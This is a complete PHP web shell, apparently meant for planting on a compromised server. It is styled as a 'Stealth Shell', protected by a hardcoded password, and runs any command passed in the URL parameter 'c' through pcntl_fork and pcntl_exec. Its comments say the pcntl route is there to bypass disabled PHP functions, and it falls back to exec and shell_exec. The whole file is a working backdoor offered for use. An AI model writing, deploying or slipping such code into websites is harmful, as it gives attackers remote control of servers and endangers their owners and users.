<?php
error_reporting(0);
session_start();

$password = "wiredmouseis";   

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['p']) && $_POST['p'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        die('<html><head><title>Access</title></head><body style="background:#000;color:#0f0;font-family:consolas;text-align:center;padding-top:100px;">
        <h2>Enter Password</h2>
        <form method="post"><input type="password" name="p" style="background:#111;border:1px solid #0f0;color:#0f0;padding:10px;width:300px;"></form>
        </body></html>');
    }
}

// Command Execution using pcntl_exec
if (isset($_GET['c']) && !empty($_GET['c'])) {
    $cmd = $_GET['c'];
    
    // Fork aur pcntl_exec se bypass
    if (function_exists('pcntl_fork')) {
        $pid = pcntl_fork();
        if ($pid == 0) {
            // Child process
            if (function_exists('pcntl_exec')) {
                pcntl_exec('/bin/sh', ['-c', $cmd . ' 2>&1']);
            } else {
                exec($cmd); // fallback (agar kaam kare)
            }
            exit(0);
        } else if ($pid > 0) {
            // Parent process - wait thoda
            sleep(1);
            echo "<pre style='background:#111;color:#0f0;padding:15px;'>";
            echo htmlspecialchars(shell_exec($cmd . " 2>&1") ?: "Command sent...");
            echo "</pre>";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Stealth Shell</title>
    <style>
        body{background:#0a0a0a;color:#0f0;font-family:Consolas;margin:0;padding:20px;}
        input{width:80%;padding:12px;background:#111;border:1px solid #0f0;color:#0f0;}
        .output{background:#111;padding:15px;border:1px solid #222;margin-top:15px;white-space:pre-wrap;}
    </style>
</head>
<body>
    <h2>PCNTL Shell</h2>
    <form>
        <input type="text" name="c" placeholder="Command here (id, whoami, ls -la etc)" autofocus>
        <input type="submit" value="Run" style="padding:12px;">
    </form>

    <div class="output">
        <?php if(isset($_GET['c'])) echo "→ Running: " . htmlspecialchars($_GET['c']) . "\n"; ?>
    </div>
</body>
</html>
